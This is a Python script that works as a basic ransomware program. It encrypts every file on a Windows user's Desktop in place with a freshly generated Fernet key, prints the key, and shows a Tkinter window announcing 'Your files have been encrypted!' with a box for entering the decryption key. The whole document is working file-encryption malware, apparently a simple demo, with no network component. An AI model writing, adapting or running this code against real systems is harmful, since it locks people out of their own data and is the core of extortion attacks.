from cryptography.fernet import Fernet 
import os 
import tkinter as tk

key = Fernet.generate_key() 
fernet = Fernet(key) 
 
folder_path = r"C:\Users\Admin\Desktop" 
 
for file_name in os.listdir(folder_path):
    if file_name.lower() == "desktop.ini":
        continue

    file_path = os.path.join(folder_path, file_name)

    if os.path.isdir(file_path):
        continue

    with open(file_path, "rb") as file:
        original = file.read()

    encrypted = fernet.encrypt(original)

    with open(file_path, "wb") as encrypted_file:
        encrypted_file.write(encrypted)
 
 
print(f"🔐 Encryption Key (Copy this!): {key.decode()}") 
 
def try_decrypt(): 
    user_key = key_entry.get().encode() 
    try: 
        fernet_attempt = Fernet(user_key) 
        for file_name in os.listdir(folder_path): 
            file_path = os.path.join(folder_path, file_name) 
 
            if os.path.isdir(file_path): 
                continue 
 
            with open(file_path, "rb") as enc_file: 
                encrypted_data = enc_file.read() 
 
            decrypted = fernet_attempt.decrypt(encrypted_data) 
 
            with open(file_path, "wb") as dec_file: 
                dec_file.write(decrypted) 
 
        status_label.config(text="✅ Files decrypted successfully!") 
    except: 
        status_label.config(text="❌ Invalid decryption key!") 
 
root = tk.Tk() 
root.title("🔒 Your Files Have Been Encrypted!")

root.geometry("420x200") 
root.resizable(False, False) 
 
tk.Label(root, text="⚠️ Your files have been encrypted!", font=("Helvetica", 14)).pack(pady=10) 
tk.Label(root, text="Enter decryption key to unlock them:").pack() 
 
key_entry = tk.Entry(root, width=50) 
key_entry.pack(pady=5) 
 
tk.Button(root, text="🔓 Decrypt Files", command=try_decrypt).pack(pady=10) 
 
status_label = tk.Label(root, text="", font=("Helvetica", 11)) 
status_label.pack() 
 
root.mainloop() 